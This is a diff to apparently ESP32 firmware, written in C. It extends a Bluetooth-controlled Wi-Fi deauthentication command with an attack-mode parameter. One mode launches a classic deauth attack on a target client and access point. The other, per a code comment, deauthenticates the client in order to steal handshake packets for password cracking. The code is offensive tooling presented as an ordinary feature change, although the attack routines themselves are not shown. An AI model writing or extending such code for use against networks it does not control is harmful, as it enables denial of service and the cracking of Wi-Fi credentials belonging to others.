@@ -139,10 +139,12 @@ void handle_deauth_command(char *action) {
         char *param1_targetMac = strtok(NULL, "|");
         char *param2_apMac = strtok(NULL, "|");
         char *param3_ch = strtok(NULL, "|");
+        char *param4_attackMode = strtok(NULL, "|");
 
         char target[18] = {0};
         char ap[18] = {0};
         int channel = -1;
+        int attackMode = -1;
 
         if (param1_targetMac && strncmp(param1_targetMac, "TARGET=", 7) == 0) {
             strncpy(target, param1_targetMac + 7, sizeof(target) - 1);
@@ -154,6 +156,10 @@ void handle_deauth_command(char *action) {
 
         if (param3_ch && strncmp(param3_ch, "CHANNEL=", 8) == 0) {
             channel = atoi(param3_ch + 8);
+        }
+
+        if (param4_attackMode && strncmp(param4_attackMode, "ATTACKMODE=", 11) == 0) {
+            attackMode = atoi(param4_attackMode + 11);
         }
 
         if (!target[0] || !ap[0] || channel <= 0) {
@@ -178,9 +184,19 @@ void handle_deauth_command(char *action) {
         }
 
         if(!deauthActive) {
-            BleManager_SendStatus("LOG|DEAUTH|msg=DEAUTH_INITIALIZING...");
-            vTaskDelay(pdMS_TO_TICKS(500));
-            start_deauth_attack(target, ap, channel);
+            // Attack Mode (1 = Deauth classic, 2 = Steal Auth Packet for handshake cracking)
+            if(attackMode == 1) {
+                BleManager_SendStatus("LOG|DEAUTH|msg=CLASSIC_DEAUTH_INITIALIZING...");
+                vTaskDelay(pdMS_TO_TICKS(500));
+                start_deauth_attack(target, ap, channel);
+            } else if (attackMode == 2) {
+                BleManager_SendStatus("LOG|DEAUTH|msg=STEAL_HANDSHAKE_DEAUTH_INITIALIZING...");
+                vTaskDelay(pdMS_TO_TICKS(500));
+                start_deauth_steal_attack(target, ap, channel);
+            } else {
+                BleManager_SendStatus("LOG|DEAUTH|msg=DEAUTH_ATTACKMODE_NOT_KNOWN");
+            }
+            
         } else{
             BleManager_SendStatus("LOG|DEAUTH|msg=DEAUTH_ALREADY_RUNNING");
         }
